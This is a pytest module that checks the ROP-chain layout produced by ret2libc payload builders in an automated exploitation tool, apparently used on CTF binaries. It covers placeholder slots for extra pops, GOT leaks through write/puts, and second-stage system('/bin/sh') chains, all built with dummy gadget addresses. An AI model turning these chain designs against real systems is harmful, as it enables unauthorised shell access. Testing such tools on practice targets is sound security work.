"""B-007 variant cascade tests for ``autopwn.primitives.ret2libc_*_x64``.

Background
----------
P6.4b / P6.3b fix: ``Ret2LibcWriteX64.build_payload`` (and
``Ret2LibcPutX64.build_stage2_payload``) must mirror v3.1's
3-variant (write) / 2-variant (put) cascade in
``_legacy.ret2libc_write_x64`` L927-996 and
``_legacy.ret2libc_put_x64`` L2010-2017.  When ropper finds
``pop rdi; pop <reg>; ret`` (``extra_rdi=1``) and/or
``pop rsi; pop <reg>; ret`` (``extra_rsi=1``), v3.1 inserts a
``0`` placeholder in the stack chain to consume the extra slot
— without it, the ROP chain goes out of alignment and ``write()``
returns to a garbage address (manifests as
``unpack requires a buffer of 8 bytes`` during leak parse).

This module covers the 6 cascade variants in isolation:
* Ret2LibcWriteX64.build_payload: extra_rsi=1 / extra_rdi=1 / both=0 (3 cases)
* Ret2LibcWriteX64.build_stage2_payload: extra_rdi=1 / extra_rdi=0 (2 cases)
* Ret2LibcPutX64.build_stage2_payload: extra_rdi=1 / extra_rdi=0 (2 cases — defensive)
"""
from __future__ import annotations

import struct
from pathlib import Path

import pytest

from tests.conftest import ctx_for


pytestmark = pytest.mark.primitive


LIBC_64 = "/lib/x86_64-linux-gnu/libc.so.6"


# ---------------------------------------------------------------------------
# Ret2LibcWriteX64.build_payload: 3-variant cascade (P6.4b / B-007)
# ---------------------------------------------------------------------------


class TestRet2LibcWriteX64BuildPayloadVariants:
    """Stage-1 payload shape depends on extra_rdi / extra_rsi signals.

    v3.1 main() L927-958 has 3 branches:
      * other_rsi_registers == 1: 6-arg chain with 0 placeholder after write_got
      * other_rdi_registers == 1: 6-arg chain with 0 placeholder after fd
      * both 0: 5-arg chain (current P6.4 default — preserved as fallback)
    """

    def _make_ctx(self, *, extra_rdi: int, extra_rsi: int):
        from autopwn.context import RopGadgetsX64

        ctx = ctx_for("level3_x64", bit=64)
        ctx.padding = 8
        ctx.gadgets_x64 = RopGadgetsX64(
            pop_rdi=0xAAAA, pop_rsi=0xBBBB, ret=0xCCCC,
            extra_rdi=extra_rdi, extra_rsi=extra_rsi,
        )
        return ctx

    def test_extra_rsi_1_inserts_0_after_write_got(self, challenge_dir):
        """extra_rsi=1 → 6-arg pop chain with 0 placeholder after write_got.

        v3.1 L927-937:
          [pop_rdi, fd=1, pop_rsi, write_got, **0**, write_plt, main]
        Total 7 p64 + 8 padding = 64 bytes.
        """
        from autopwn.primitives.ret2libc_write import Ret2LibcWriteX64

        ctx = self._make_ctx(extra_rdi=0, extra_rsi=1)
        payload = Ret2LibcWriteX64().build_payload(ctx)
        assert len(payload) == 8 + 7 * 8  # padding + 7 p64 = 64
        pop_rdi, fd, pop_rsi, write_got, placeholder, write_plt, main = (
            struct.unpack("<7Q", payload[8:])
        )
        assert pop_rdi == 0xAAAA
        assert fd == 1
        assert pop_rsi == 0xBBBB
        assert write_got != 0
        assert placeholder == 0   # the 0 placeholder (key assertion)
        assert write_plt != 0
        assert main != 0

    def test_extra_rdi_1_inserts_0_after_fd(self, challenge_dir):
        """extra_rdi=1 → 6-arg pop chain with 0 placeholder after fd.

        v3.1 L938-948:
          [pop_rdi, fd=1, **0**, pop_rsi, write_got, write_plt, main]
        Total 7 p64 + 8 padding = 64 bytes.
        """
        from autopwn.primitives.ret2libc_write import Ret2LibcWriteX64

        ctx = self._make_ctx(extra_rdi=1, extra_rsi=0)
        payload = Ret2LibcWriteX64().build_payload(ctx)
        assert len(payload) == 8 + 7 * 8
        pop_rdi, fd, placeholder, pop_rsi, write_got, write_plt, main = (
            struct.unpack("<7Q", payload[8:])
        )
        assert pop_rdi == 0xAAAA
        assert fd == 1
        assert placeholder == 0   # the 0 placeholder (key assertion)
        assert pop_rsi == 0xBBBB
        assert write_got != 0
        assert write_plt != 0
        assert main != 0

    def test_both_extra_0_is_5_arg_chain(self, challenge_dir):
        """both extra=0 → 5-arg pop chain (P6.4 default, preserved)."""
        from autopwn.primitives.ret2libc_write import Ret2LibcWriteX64

        ctx = self._make_ctx(extra_rdi=0, extra_rsi=0)
        payload = Ret2LibcWriteX64().build_payload(ctx)
        assert len(payload) == 8 + 6 * 8  # padding + 6 p64 = 56
        pop_rdi, fd, pop_rsi, write_got, write_plt, main = (
            struct.unpack("<6Q", payload[8:])
        )
        assert pop_rdi == 0xAAAA
        assert fd == 1
        assert pop_rsi == 0xBBBB
        assert write_got != 0
        assert write_plt != 0
        assert main != 0

    def test_extra_rsi_1_wins_over_extra_rdi_1(self, challenge_dir):
        """extra_rsi=1 takes precedence over extra_rdi=1 (v3.1 L927 ordering).

        v3.1 main() L927 checks ``other_rsi_registers == 1`` BEFORE
        ``other_rdi_registers == 1``.  This test guards the
        if/elif/else ordering in P6.4b — must NOT collapse to a
        single combined branch.
        """
        from autopwn.primitives.ret2libc_write import Ret2LibcWriteX64

        ctx = self._make_ctx(extra_rdi=1, extra_rsi=1)
        payload = Ret2LibcWriteX64().build_payload(ctx)
        # Same shape as extra_rsi=1 (not extra_rdi=1) — the 0 placeholder
        # is AFTER write_got, not after fd.
        pop_rdi, fd, pop_rsi, write_got, placeholder, write_plt, main = (
            struct.unpack("<7Q", payload[8:])
        )
        assert placeholder == 0
        # fd is right after pop_rdi (no 0 placeholder in between)
        assert fd == 1


# ---------------------------------------------------------------------------
# Ret2LibcWriteX64.build_stage2_payload: 2-variant cascade (P6.4b / B-007)
# ---------------------------------------------------------------------------


class TestRet2LibcWriteX64BuildStage2Variants:
    """Stage-2 payload shape depends on extra_rdi signal.

    v3.1 main() L983-996 has 2 branches:
      * extra_rdi=1: 5-p64 chain with 0 placeholder between sh and ret
      * extra_rdi=0: 4-p64 chain (current P6.4 default — preserved)
    """

    def _make_ctx(self, *, extra_rdi: int):
        from pwn import ELF
        from autopwn.context import RopGadgetsX64

        ctx = ctx_for("level3_x64", bit=64)
        ctx.padding = 8
        ctx.gadgets_x64 = RopGadgetsX64(
            pop_rdi=0xAAAA, pop_rsi=0xBBBB, ret=0xCCCC,
            extra_rdi=extra_rdi, extra_rsi=0,
        )
        ctx.libc.elf = ELF(LIBC_64, checksec=False)
        return ctx

    def test_extra_rdi_1_inserts_0_between_sh_and_ret(self, challenge_dir):
        """extra_rdi=1 → 5-p64 chain with 0 placeholder between sh and ret.

        v3.1 L983-996:
          [pop_rdi, sh, **0**, ret, system]
        Total 5 p64 + 8 padding = 48 bytes.
        """
        from autopwn.primitives.ret2libc_write import Ret2LibcWriteX64

        ctx = self._make_ctx(extra_rdi=1)
        libc = ctx.libc.elf
        libc_write_offset = libc.symbols["write"]
        fake_leak = 0x200000 + libc_write_offset
        payload = Ret2LibcWriteX64().build_stage2_payload(ctx, fake_leak)
        assert len(payload) == 8 + 5 * 8  # padding + 5 p64 = 48
        pop_rdi, sh, placeholder, ret, system = struct.unpack("<5Q", payload[8:])
        assert pop_rdi == 0xAAAA
        assert sh == 0x200000 + next(libc.search(b"/bin/sh"))
        assert placeholder == 0   # the 0 placeholder (key assertion)
        assert ret == 0xCCCC       # alignment gadget
        assert system == 0x200000 + libc.symbols["system"]

    def test_extra_rdi_0_is_4_p64_chain(self, challenge_dir):
        """extra_rdi=0 → 4-p64 chain (P6.4 default, preserved)."""
        from autopwn.primitives.ret2libc_write import Ret2LibcWriteX64

        ctx = self._make_ctx(extra_rdi=0)
        libc = ctx.libc.elf
        libc_write_offset = libc.symbols["write"]
        fake_leak = 0x200000 + libc_write_offset
        payload = Ret2LibcWriteX64().build_stage2_payload(ctx, fake_leak)
        assert len(payload) == 8 + 4 * 8  # padding + 4 p64 = 40
        pop_rdi, sh, ret, system = struct.unpack("<4Q", payload[8:])
        assert pop_rdi == 0xAAAA
        assert sh == 0x200000 + next(libc.search(b"/bin/sh"))
        assert ret == 0xCCCC
        assert system == 0x200000 + libc.symbols["system"]


# ---------------------------------------------------------------------------
# Ret2LibcPutX64.build_stage2_payload: 2-variant cascade (P6.3b / B-007 defensive)
# ---------------------------------------------------------------------------


class TestRet2LibcPutX64BuildStage2Variants:
    """P6.3b defensive: put stage-2 mirrors v3.1 L2010-2017 cascade.

    Not exposed by P8.4 §2.6 baseline (no Challenge/ binary hits
    ret2libc-put-x64), but the contract layer must match v3.1
    to prevent future binary regressions.
    """

    def _make_ctx(self, *, extra_rdi: int):
        from pwn import ELF
        from autopwn.context import RopGadgetsX64

        ctx = ctx_for("rip", bit=64)
        ctx.padding = 8
        ctx.gadgets_x64 = RopGadgetsX64(
            pop_rdi=0xAAAA, pop_rsi=0, ret=0xBBBB,
            extra_rdi=extra_rdi, extra_rsi=0,
        )
        ctx.libc.elf = ELF(LIBC_64, checksec=False)
        return ctx

    def test_extra_rdi_1_inserts_0_between_sh_and_ret(self, challenge_dir):
        """extra_rdi=1 → 5-p64 chain with 0 placeholder between sh and ret."""
        from autopwn.primitives.ret2libc_put import Ret2LibcPutX64

        ctx = self._make_ctx(extra_rdi=1)
        libc = ctx.libc.elf
        libc_puts_offset = libc.symbols["puts"]
        fake_leak = 0x200000 + libc_puts_offset
        payload = Ret2LibcPutX64().build_stage2_payload(ctx, fake_leak)
        assert len(payload) == 8 + 5 * 8  # padding + 5 p64 = 48
        pop_rdi, sh, placeholder, ret, system = struct.unpack("<5Q", payload[8:])
        assert pop_rdi == 0xAAAA
        assert sh == 0x200000 + next(libc.search(b"/bin/sh"))
        assert placeholder == 0   # the 0 placeholder (key assertion)
        assert ret == 0xBBBB
        assert system == 0x200000 + libc.symbols["system"]

    def test_extra_rdi_0_is_4_p64_chain(self, challenge_dir):
        """extra_rdi=0 → 4-p64 chain (P6.3 default, preserved)."""
        from autopwn.primitives.ret2libc_put import Ret2LibcPutX64

        ctx = self._make_ctx(extra_rdi=0)
        libc = ctx.libc.elf
        libc_puts_offset = libc.symbols["puts"]
        fake_leak = 0x200000 + libc_puts_offset
        payload = Ret2LibcPutX64().build_stage2_payload(ctx, fake_leak)
        assert len(payload) == 8 + 4 * 8
        pop_rdi, sh, ret, system = struct.unpack("<4Q", payload[8:])
        assert pop_rdi == 0xAAAA
        assert sh == 0x200000 + next(libc.search(b"/bin/sh"))
        assert ret == 0xBBBB
        assert system == 0x200000 + libc.symbols["system"]
